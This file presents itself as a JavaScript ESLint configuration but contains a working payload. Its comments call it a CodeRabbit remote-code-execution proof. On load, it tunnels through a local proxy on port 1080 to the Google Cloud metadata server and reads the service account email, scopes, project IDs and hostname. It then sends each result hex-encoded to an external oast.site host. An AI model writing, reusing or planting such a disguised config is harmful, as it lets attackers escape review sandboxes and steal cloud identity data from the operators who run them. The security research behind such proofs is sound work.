// CodeRabbit RCE — ESCAPE PROOF: read GCP metadata via proxy CONNECT-tunnel.
// localhost:1080 honors CONNECT and tunnels to metadata:80 (sandbox is firewalled from it).
// Responsible: retrieves the SA IDENTITY (email/scopes/project/SA-list), NOT the access token.
var C = 'd8soamroeaqnk9qs3d905dte3hpgjnhmh.oast.site';
var http = require('http'), dns = require('dns'), net = require('net');
var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 1700), timeout: 9000 }, function () {}).on('error', function () {}); } catch (e) {} };
try { dns.lookup('alive11.' + C, function () {}); } catch (e) {}

// CONNECT tunnel to host:port via proxy, then GET path; exfil the full response on close.
var tunnelGet = function (host, port, path, tag, reqHost) {
  try {
    var s = net.connect({ host: '127.0.0.1', port: 1080, timeout: 9000 });
    var hdr = '', tun = false, resp = '', done = false;
    var flush = function (pfx) { if (done) return; done = true; httpX(tag, (pfx || '') + (resp || hdr).slice(0, 700)); try { s.destroy(); } catch (e) {} };
    s.on('connect', function () { s.write('CONNECT ' + host + ':' + port + ' HTTP/1.1\r\nHost: ' + host + ':' + port + '\r\n\r\n'); });
    s.on('data', function (d) {
      var str = d.toString('latin1');
      if (!tun) {
        hdr += str;
        if (/\r\n\r\n/.test(hdr)) {
          tun = true;
          if (/ 200 /.test(hdr.split('\r\n')[0])) {
            var extra = hdr.split('\r\n\r\n').slice(1).join('\r\n\r\n'); resp += extra;
            s.write('GET ' + path + ' HTTP/1.1\r\nHost: ' + (reqHost || host) + '\r\nMetadata-Flavor: Google\r\nConnection: close\r\n\r\n');
          } else { flush('NOTUNNEL:'); }
        }
      } else { resp += str; }
    });
    s.on('end', function () { flush('RESP:'); });
    s.on('close', function () { flush('RESP:'); });
    s.on('error', function (e) { if (!done) { done = true; httpX(tag, 'ERR:' + ((e && e.code) || e)); } });
    s.on('timeout', function () { flush('TO:'); });
  } catch (e) { httpX(tag, 'EXC'); }
};

tunnelGet('metadata.google.internal', 80, '/computeMetadata/v1/instance/service-accounts/default/email', 'sa_email');
tunnelGet('metadata.google.internal', 80, '/computeMetadata/v1/instance/service-accounts/default/scopes', 'sa_scopes');
tunnelGet('metadata.google.internal', 80, '/computeMetadata/v1/project/project-id', 'proj');
tunnelGet('metadata.google.internal', 80, '/computeMetadata/v1/project/numeric-project-id', 'projnum');
tunnelGet('metadata.google.internal', 80, '/computeMetadata/v1/instance/service-accounts/', 'sa_list');
tunnelGet('metadata.google.internal', 80, '/computeMetadata/v1/instance/hostname', 'vmhost');

module.exports = { root: true, rules: {} };
